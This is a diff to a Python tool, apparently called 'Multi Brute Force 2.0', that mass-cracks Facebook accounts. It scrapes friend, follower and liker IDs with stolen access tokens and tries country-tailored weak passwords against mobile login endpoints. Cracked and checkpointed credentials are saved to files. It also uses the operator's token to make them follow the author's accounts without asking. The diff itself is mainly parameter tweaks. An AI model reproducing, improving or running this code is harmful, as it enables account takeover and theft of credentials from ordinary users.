@@ -33,16 +33,9 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Ahmed  Alzwage      │\n       /  ^ \/ / // /  ^ \   │•• Github.com/ahmedalzwage ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By AhmedAlzwage   │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/AhmedAlzwage ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
-ips=None
-try:
-	b=requests.get("http://ip-api.com/json/").json()["query"]
-	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]"}).json()["country"].lower()
-except:
-	ips=None
-
 ok = []
 cp = []
 ttl =[]
@@ -89,7 +82,7 @@ def basecookie():
 def hdcok():
 	global host
 	hosts=host
-	r={"origin": hosts, "accept-language": "ar-AR;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.23;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
+	r={"origin": hosts, "accept-language": "ar-AR,ar;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
 	return r
 
 def gets_cookies(cookies):
@@ -118,6 +111,7 @@ def country():
     print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))
     print("%s[%s3%s] %sPakistan"%(k,p,k,p))
     print("%s[%s4%s] %sUSA"%(k,p,k,p))
+    print("%s[%s0%s] %sNone"%(k,p,k,p))
     choose_country()
     
 def choose_country():
@@ -157,6 +151,16 @@ def choose_country():
     elif cc in["4","04"]:
         os.system("rm -rf country.txt")
         cou = "us"
+        try:
+            ctry = open('country.txt','w')
+            ctry.write(cou)
+            ctry.close()
+            menu()
+        except (KeyError, IOError):
+            menu()
+    elif cc in["0","00"]:
+        os.system("rm -rf country.txt")
+        cou = " "
         try:
             ctry = open('country.txt','w')
             ctry.write(cou)
@@ -215,12 +219,12 @@ def gen():
         cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
         try:
                 data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
-                "user-agent"                : "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", # AhmedHusenAldukali.
+                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                 "referer"                   : "https://m.facebook.com/",
-                "host"                      : "free.Facebook.com",
+                "host"                      : "m.facebook.com",
                 "origin"                    : "https://m.facebook.com",
                 "upgrade-insecure-requests" : "1",
-                "accept-language"           : "AR,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+                "accept-language"           : "ar-AR,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                 "cache-control"             : "max-age=0",
                 "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                 "content-type"              : "text/html; charset=utf-8"
@@ -241,7 +245,7 @@ def gen():
         print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
         bot_follow()
 
-### BOT FOLLOW ### AhmedHusenAldukali !!!
+### BOT FOLLOW ### AhmedHusenAldokali !!!
 
 def bot_follow():
 	try:
@@ -255,7 +259,7 @@ def bot_follow():
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/100000972552823/subscribers?access_token=" + toket) # ﹻۣۗۗۗﹻۣۛﹻۣۗۗۗﹻﹻۣۗۗۗﹻ ألہجہٰٰﹻﹻﹻٰ۫ﹻﹻﹻنہﹻﹻٰ۫ﹻﹻرﺄل ﹻۣۗۗۗﹻۣۛﹻۣۗۗۗﹻﹻۣۗۗۗﹻ
-	requests.post("https://graph.facebook.com/100037017753936/subscribers?access_token=" + toket) # Ahmed Husen Al Dukali
+    requests.post("https://graph.facebook.com/100037017753936/subscribers?access_token=" + toket) # Ahmed Husen Al Dukali
 	menu()
 
 ### MAIN MENU ###
@@ -280,12 +284,14 @@ def menu():
         negara = "Pakistan"
     elif "us" in ngr:
         negara = "USA"
+    elif " " in ngr:
+        negara = "None"
     os.system("clear")
     banner()
     print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
     print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"•"+k+"]"+p+" Status  : "+m+"Hack Libya"+p))
+    print((k+"["+p+"•"+k+"]"+p+" Status  : "+m+"Hacker Libya"+p))
     print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
     print((k+"["+p+"•"+k+"]"+p+" Crack   : "+negara))
     print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
@@ -334,7 +340,7 @@ def choose_menu():
 def pilihcrack(file):
   print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Fast"+p+")"))
   print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
-  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")("+h+"Recommended"+p+")"))
+  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")"))
   print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
   print((k+"["+p+"5"+k+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
   krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
@@ -375,7 +381,7 @@ def publik():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=50000&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -406,7 +412,7 @@ def follow():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -437,7 +443,7 @@ def likers():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=999999&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -456,14 +462,14 @@ def likers():
 def random_numbers():
   data = []
   print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 7 Digit"))
-  print((k+"["+p+"•"+k+"]"+p+" Example : 0021891"))
+  print((k+"["+p+"•"+k+"]"+p+" Example : 0021892"))
   kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
   exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 7 Digit")) if len(kode) < 7 else ''
   exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 7 Digit")) if len(kode) > 7 else ''
   jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
   [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
   print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
-  with concurrent.futures.ThreadPoolExecutor(max_workers=5000) as th:
+  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   input(k+"\n[ "+p+"Back"+k+" ]"+p)
   menu()
@@ -482,7 +488,7 @@ def random_email():
   setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
   print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
   [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
-  with concurrent.futures.ThreadPoolExecutor(max_workers=5000) as th:
+  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   input(k+"\n[ "+p+"Back"+k+" ]"+p)
   menu()
@@ -559,7 +565,7 @@ def target():
 			except KeyError:
 				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
 			try:
-				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=500000&access_token="+toket)
+				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 				id = []
 				b = json.loads(a.text)
 				bb = (op["first_name"]+".json").replace(" ","_")
@@ -613,31 +619,30 @@ def generate(text):
 				results.append(i+"12345")
 				results.append(i)
 				if "id" in ct:
-					results.append("libya123")
+					results.append("1234554321")
+					results.append("1122334455")
+					results.append("123456654321")
+					results.append("112233445566")
 				elif "bd" in ct:
-					results.append("009988009988")
-					results.append("098098")
-					results.append("00998877")
-					results.append("009988")
-				elif "pk" in ct:
-					results.append("19981998")
 					results.append("19991999")
 					results.append("20002000")
 					results.append("20012001")
 					results.append("20022002")
-					results.append("20032003")
-					results.append("20042004")
+				elif "pk" in ct:
+					results.append("1020304050")
+					results.append("102030405060")
+					results.append("009988")
 				elif "us" in ct:
-					results.append("1122334455")
-					results.append("112233445566")
-					results.append("1234554321")
-					results.append("123456654321")
+					results.append("123456")
+					results.append("qwerty")
+					results.append("iloveyou")
+					results.append("passwords")
 	return results
 
 ### USER AGENT ###
 
 def defaultua():
-    ua = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]"
+    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
     try:
         ugent = open('ugent.txt','w')
         ugent.write(ua)
@@ -726,7 +731,7 @@ def mbasic(em,pas,hosts):
 		}
 	)
 	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=5000",data=data).text
+	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
 	if "c_user" in list(r.cookies.get_dict().keys()):
 		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	elif "checkpoint" in list(r.cookies.get_dict().keys()):
@@ -793,7 +798,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -835,16 +840,14 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
-					open("cp.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s               "%(fl.get("id"),i)))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
+					open("cp.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
-					open("ok.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					open("ok.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
@@ -882,7 +885,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -928,20 +931,21 @@ class crackttl:
 						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
+						print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s • %s          "%(fl.get("id"),i,ttl)))
+						self.cp.append("%s | %s | %s"%(fl.get("id"),i,ttl))
+						open("cp.txt","a+").write("%s | %s | %s\n"%(fl.get("id"),i,ttl))
+						break
+					except(KeyError, IOError):
+						ttl = " "
 					except:pass
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
-					open("cp.txt","a+").write(
-						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s               "%(fl.get("id"),i)))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
+					open("cp.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
-					if fl.get("id") in open("ok.txt").read():
-						break
-					else:
-						open("ok.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mCP\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					open("ok.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
@@ -979,7 +983,7 @@ class crackffb:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1021,16 +1025,14 @@ class crackffb:
 				log=f_fb(fl.get("id"),
 					i,"https://free.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
-					open("cp.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s               "%(fl.get("id"),i)))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
+					open("cp.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
-					open("ok.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					open("ok.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
@@ -1064,7 +1066,7 @@ class bapi:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Example : libya123,libya,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
@@ -1174,7 +1176,7 @@ class bapittl:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
